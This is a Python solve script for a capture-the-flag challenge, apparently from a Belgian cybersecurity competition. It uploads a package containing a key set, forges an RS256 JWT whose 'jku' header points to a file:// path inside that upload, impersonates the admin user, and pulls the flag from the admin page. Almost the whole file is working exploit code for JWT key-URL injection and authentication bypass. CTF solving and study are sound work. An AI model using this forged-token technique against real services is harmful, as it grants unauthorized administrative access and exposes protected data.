# 0. Forge JKU and payload (Can be pre-done)
# 1. Create account
# 2. Create repository
# 3. Upload payload
# 4. Forge JWT with our JKU, pointing to our repo
# 5. Access /admin.html with our forged JWT

import jwt
import json
import requests
import random
import string
import re
import yaml

print("Loading token...")
token_private_key_json = json.load(open("package_full.yaml"))
token_private_key_jwk = jwt.PyJWKSet(token_private_key_json["keys"])
print(f"Loaded key with id {token_private_key_jwk.keys[0].key_id}")


acc = "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
print("Creating account...")
s = requests.session()
acc_res = s.post(
    "http://pequod_package_provider.challenges.cybersecuritychallenge.be/signup",
    {
        "username": acc,
        "password": acc,
    },
)
acc_res.raise_for_status()
print(f"Created account {acc}")

print("Creating repository...")
repo_res = s.post(
    "http://pequod_package_provider.challenges.cybersecuritychallenge.be/api/packages"
)
repo_res.raise_for_status()
repository_id = repo_res.text
print(f"Created repository {repository_id}")

print("Pushing payload...")
payload_res = s.post(
    f"http://pequod_package_provider.challenges.cybersecuritychallenge.be/api/packages/{repository_id}",
    data=open("package.zip", "rb").read(),
    headers={"Content-Type": "application/zip"},
)
payload_res.raise_for_status()
print(f"Payload uploaded")

print("Getting admin uuid...")
share_res = s.get(
    f"http://pequod_package_provider.challenges.cybersecuritychallenge.be/api/packages/{repository_id}/share"
)
share_res.raise_for_status()
admin_id = yaml.safe_load(share_res.text)[0]["id"]
print(f"Got admin id: {admin_id}")

print("Creating token...")
token = jwt.encode(
    {
        "iss": "http://pequod_package_provider.challenges.cybersecuritychallenge.be",
        "sub": admin_id,
    },
    key=token_private_key_jwk.keys[0].key,
    headers={
        "jku": f"file:///opt/pequod/repository/{repository_id}/exploit.yaml",
        "kid": token_private_key_jwk.keys[0].key_id,
    },
    algorithm="RS256",
)
print("Token Created!")

admin_res = requests.get(
    "http://pequod_package_provider.challenges.cybersecuritychallenge.be/admin",
    cookies={
        "Authorization": token,
    },
)
admin_res.raise_for_status()
admin_text = admin_res.text
flag = re.search(r"CSC{.*?}", admin_text, flags=re.MULTILINE)
if not flag:
    raise Exception(f"Flag not found {admin_text}")
print(f"\n{flag.group(0)}\n")
print("Cleaning up...")
del_res = s.delete(
    "http://pequod_package_provider.challenges.cybersecuritychallenge.be/user"
)
del_res.raise_for_status()
print("Done.")
